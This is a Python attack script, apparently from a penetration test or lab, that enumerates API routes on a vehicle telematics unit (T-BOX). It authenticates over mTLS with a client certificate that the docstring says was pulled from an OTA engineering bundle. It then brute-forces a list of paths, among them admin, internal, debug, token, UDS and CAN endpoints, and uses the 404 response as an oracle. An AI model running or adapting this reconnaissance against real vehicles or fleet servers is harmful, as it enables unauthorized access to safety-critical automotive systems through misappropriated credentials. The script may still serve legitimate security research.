#!/usr/bin/env python3
"""
T-BOX 8443 mTLS API enumeration using the engineering bundle's client cert.

The bundle we pulled from the TSP/OTA path contains exactly the PKI the T-BOX asks for:
  ca.pem      CN = CV6 Fleet Diagnostics Root   (self-signed root)
  client.pem  CN = CV6 Engineering Diagnostic Client
Handshake verified OK (TLSv1.3, peer CN=tbox), so we are past the hard wall that
blocked the whole team earlier.

Oracle: 404 text/plain "404 page not found" (19 B) = unregistered,
        anything else = a real route.
"""
import http.client
import ssl
import sys

HOST = "10.225.139.3"
PORT = 8443
CERT = "01_TARGETS/tsp/engineering-bundle/client.pem"
KEY = "01_TARGETS/tsp/engineering-bundle/client-key.pem"
CA = "01_TARGETS/tsp/engineering-bundle/ca.pem"
GO404 = b"404 page not found\n"

PATHS = r"""
/
/healthz
/health
/readyz
/version
/status
/info
/metrics
/debug/vars
/diagnostics
/diagnostics/
/diagnostics/session
/diagnostics/ticket
/diagnostics/info
/diagnostics/status
/diagnostics/health
/api
/api/
/api/v1
/api/v1/
/api/v1/diagnostics
/api/v1/diagnostics/session
/api/v1/diagnostics/ticket
/api/v1/ota
/api/v1/ota/status
/api/v1/ota/packages
/api/v1/ota/engineering-bundle
/api/v1/diag
/api/v1/status
/api/v1/health
/api/v1/info
/api/v1/session
/api/v1/ticket
/api/v1/token
/api/v1/vehicle
/api/v1/vin
/ota
/ota/
/ota/status
/ota/packages
/ota/engineering-bundle
/session
/ticket
/token
/uds
/doip
/can
/vcu
/tbox
/admin
/internal
/internal/audit
/debug/pprof/
/.well-known/jwks.json
""".strip().splitlines()

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ctx.load_cert_chain(CERT, KEY)
ctx.load_verify_locations(CA)
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_REQUIRED


def main():
    print("=" * 78)
    print(f"T-BOX {HOST}:{PORT} over mTLS  client=CN CV6 Engineering Diagnostic Client")
    print("=" * 78)
    hits = []
    for p in PATHS:
        p = p.strip()
        if not p:
            continue
        for method in ("GET", "POST"):
            try:
                c = http.client.HTTPSConnection(HOST, PORT, context=ctx, timeout=10)
                body = b"{}" if method == "POST" else None
                hdrs = {"Host": "tbox"}
                if body:
                    hdrs["Content-Type"] = "application/json"
                c.request(method, p, body=body, headers=hdrs)
                r = c.getresponse()
                data = r.read()
                c.close()
            except Exception as e:
                print(f"  {method:4s} {p:44s} EXC {type(e).__name__}: {e}")
                continue
            if r.status == 404 and data == GO404:
                continue
            hits.append((method, p, r.status, r.getheader("Content-Type"), data))
            print(f"  {method:4s} {r.status} {p:44s} ct={r.getheader('Content-Type')!r} "
                  f"len={len(data)}")
            if data:
                print(f"        {data[:400]!r}")
    print("-" * 78)
    print(f"hits={len(hits)} / {len(PATHS)*2} requests")
    for m, p, s, ct, d in hits:
        print(f"  {m:4s} {s} {p}  ct={ct}  len={len(d)}")


if __name__ == "__main__":
    main()
